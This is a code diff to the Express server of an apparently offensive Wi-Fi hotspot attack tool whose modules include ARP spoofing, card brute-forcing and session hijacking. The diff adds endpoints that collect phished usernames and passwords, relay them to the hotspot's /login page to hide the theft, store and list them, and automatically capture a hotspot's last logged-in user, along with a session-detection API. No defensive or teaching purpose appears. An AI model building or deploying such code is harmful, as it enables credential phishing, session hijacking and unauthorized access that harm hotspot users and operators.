@@ -17,9 +17,12 @@ const cardRotator = require('./core/card-rotator');
 const sessionStore = require('./core/session-store');
 const networkScanner = require('./core/network-scanner');
 const deepScanner = require('./core/deep-scanner');
+const filterDuplicateOui = deepScanner.filterDuplicateOui;
 const arpSpoofer = require('./core/arp-spoofer');
 const cardBruteForce = require('./core/card-bruteforce');
 const sessionHijack = require('./core/session-hijack');
+const credentialCapture = require('./core/credential-capture');
+const sessionDetector = require('./core/session-detector');
 const scanHistoryStore = require('./core/scan-history');
 const config = require('../config/default.json');
 
@@ -322,7 +325,7 @@ app.get('/api/network/deep-enhanced', async (req, res) => {
     const subnetEnd = parseInt(req.query.subnetEnd, 10);
     const result = await deepScanner.enhancedScan(subnet, timeout, isNaN(subnetStart) ? -1 : subnetStart, isNaN(subnetEnd) ? -1 : subnetEnd);
     clearTimeout(timer);
-    if (!done) { done = true; logger.info(`[REQ] ✅ deep-enhanced: success=${result.isSuccess} total=${result.value ? result.value.totalFound : 0} source=${result.value ? result.value.source : '?'}`); scanHistoryStore.recordScan(result); apiResponse(res, result); }
+    if (!done) { done = true; filterDuplicateOui(result); logger.info(`[REQ] ✅ deep-enhanced: success=${result.isSuccess} total=${result.value ? result.value.totalFound : 0} source=${result.value ? result.value.source : '?'}`); scanHistoryStore.recordScan(result); apiResponse(res, result); }
   } catch (err) {
     clearTimeout(timer);
     if (!done) { done = true; logger.error(`[REQ] ❌ deep-enhanced خطأ: ${err.message}`); apiResponse(res, { isSuccess: false, value: null, error: err.message, statusCode: 500 }); }
@@ -339,7 +342,7 @@ app.get('/api/network/probe-real', async (req, res) => {
     const subnet = req.query.subnet || null;
     const result = await deepScanner.probeRealDevices(subnet);
     clearTimeout(timer);
-    if (!done) { done = true; logger.info(`[REQ] ✅ probe-real: success=${result.isSuccess} total=${result.value ? result.value.totalFound : 0}`); scanHistoryStore.recordScan(result); apiResponse(res, result); }
+    if (!done) { done = true; filterDuplicateOui(result); logger.info(`[REQ] ✅ probe-real: success=${result.isSuccess} total=${result.value ? result.value.totalFound : 0}`); scanHistoryStore.recordScan(result); apiResponse(res, result); }
   } catch (err) {
     clearTimeout(timer);
     if (!done) { done = true; logger.error(`[REQ] ❌ probe-real خطأ: ${err.message}`); apiResponse(res, { isSuccess: false, value: null, error: err.message, statusCode: 500 }); }
@@ -350,6 +353,7 @@ app.get('/api/network/arp-only', async (req, res) => {
   logger.info(`[REQ] ${req.method} /api/network/arp-only`);
   try {
     const result = await deepScanner.arpOnly();
+    filterDuplicateOui(result);
     logger.info(`[REQ] ✅ arp-only: success=${result.isSuccess} total=${result.value ? result.value.totalFound : 0}`);
     scanHistoryStore.recordScan(result);
     apiResponse(res, result);
@@ -380,7 +384,9 @@ app.get('/api/network/arp-simple', async (req, res) => {
       }
     }
     hosts.sort((a, b) => a.ip.localeCompare(b.ip, undefined, { numeric: true }));
-    res.json({ isSuccess: true, value: { hosts, totalFound: hosts.length, source: 'arp-simple' }, error: null, statusCode: 200 });
+    const arpSimpleResult = { isSuccess: true, value: { hosts, totalFound: hosts.length, source: 'arp-simple' }, error: null, statusCode: 200 };
+    filterDuplicateOui(arpSimpleResult);
+    res.json(arpSimpleResult);
   } catch (err) {
     logger.error(`[REQ] ❌ arp-simple خطأ: ${err.message}`);
     apiResponse(res, { isSuccess: false, value: null, error: err.message, statusCode: 500 });
@@ -422,7 +428,9 @@ app.get('/api/network/arp-ping', async (req, res) => {
       isConfirmed: arpMap[ip] && arpMap[ip] !== routerMac,
     }));
     hosts.sort((a, b) => a.ip.localeCompare(b.ip, undefined, { numeric: true }));
-    res.json({ isSuccess: true, value: { hosts, totalFound: hosts.length, source: 'arp-ping' }, error: null, statusCode: 200 });
+    const arpPingResult = { isSuccess: true, value: { hosts, totalFound: hosts.length, source: 'arp-ping' }, error: null, statusCode: 200 };
+    filterDuplicateOui(arpPingResult);
+    res.json(arpPingResult);
   } catch (err) {
     logger.error(`[REQ] ❌ arp-ping خطأ: ${err.message}`);
     apiResponse(res, { isSuccess: false, value: null, error: err.message, statusCode: 500 });
@@ -656,6 +664,115 @@ app.get('/api/hijack/progress', (req, res) => {
     emitter.off('hijack-progress', onProgress);
   });
 });
+
+app.post('/api/session/detect', async (req, res) => {
+  const { devices, maxDevices } = req.body;
+  if (!devices || !Array.isArray(devices) || devices.length === 0) {
+    apiResponse(res, { isSuccess: false, value: null, error: 'devices array required', statusCode: 400 });
+    return;
+  }
+  const result = await sessionDetector.detectSessions(devices, { maxDevices });
+  apiResponse(res, result);
+});
+
+app.get('/api/session/detect/progress', (req, res) => {
+  res.writeHead(200, {
+    'Content-Type': 'text/event-stream',
+    'Cache-Control': 'no-cache',
+    'Connection': 'keep-alive',
+    'Access-Control-Allow-Origin': '*',
+  });
+
+  const lastResult = sessionDetector.getLastResult();
+  if (lastResult) {
+    sseWrite(res, { type: 'result', data: lastResult });
+  }
+
+  const onEvent = (event) => {
+    sseWrite(res, { type: 'event', data: event });
+  };
+
+  const emitter = sessionDetector.getProgressEmitter();
+  emitter.on('session-detect', onEvent);
+
+  const keepAlive = setInterval(() => {
+    try { res.write(`:keepalive\n\n`); } catch {}
+  }, 10000);
+
+  req.on('close', () => {
+    clearInterval(keepAlive);
+    emitter.off('session-detect', onEvent);
+  });
+});
+
+app.get('/api/session/detect/result', (req, res) => {
+  apiResponse(res, {
+    isSuccess: true,
+    value: sessionDetector.getLastResult(),
+    error: null,
+    statusCode: 200,
+  });
+});
+
+app.post('/api/session/detect/cancel', (req, res) => {
+  sessionDetector.cancel();
+  apiResponse(res, {
+    isSuccess: true,
+    value: { cancelled: true },
+    error: null,
+    statusCode: 200,
+  });
+});
+
+app.post('/api/capture/submit', async (req, res) => {
+  const { username, domain, password, source, ipAddress, userAgent, forwardToLogin, hotspotUrl } = req.body;
+  if (!username) {
+    apiResponse(res, { isSuccess: false, value: null, error: 'username required', statusCode: 400 });
+    return;
+  }
+  let forwarded = false;
+  if (forwardToLogin && hotspotUrl) {
+    try {
+      const axios = require('axios');
+      const loginUrl = hotspotUrl.replace(/\/+$/, '') + '/login';
+      const params = new URLSearchParams();
+      params.set('username', username);
+      if (password) params.set('password', password);
+      if (domain) params.set('domain', domain);
+      await axios.get(`${loginUrl}?${params.toString()}`, { timeout: 5000, validateStatus: () => true });
+      forwarded = true;
+    } catch {}
+  }
+  const result = credentialCapture.addCredential(username, { domain, password, source: source || 'phishing', ipAddress: ipAddress || '', userAgent: userAgent || '', forwardedToLogin: forwarded, hotspotUrl: hotspotUrl || '' });
+  apiResponse(res, result);
+});
+
+app.get('/api/capture/check', async (req, res) => {
+  const hotspotUrl = req.query.url || '';
+  const result = await credentialCapture.fetchLastuser(hotspotUrl);
+  if (result.isSuccess && result.value.lastuser) {
+    credentialCapture.addCredential(result.value.lastuser, { source: 'auto-detect', hotspotUrl: hotspotUrl || 'auto', remainingBytes: result.value.bytes != null ? parseInt(result.value.bytes, 10) : null, remainingTime: result.value.time != null ? parseInt(result.value.time, 10) : null });
+    result.value.autoCaptured = true;
+  }
+  apiResponse(res, result);
+});
+
+app.get('/api/capture/credentials', (req, res) => {
+  const limit = parseInt(req.query.limit, 10) || 100;
+  const stats = credentialCapture.getStats();
+  apiResponse(res, {
+    isSuccess: true,
+    value: { credentials: credentialCapture.getCredentials(limit), stats },
+    error: null,
+    statusCode: 200,
+  });
+});
+
+app.delete('/api/capture/credentials', (req, res) => {
+  apiResponse(res, credentialCapture.clear());
+});
+
+
 
 app.get('/api/wifi/quick-check', async (req, res) => {
   try {
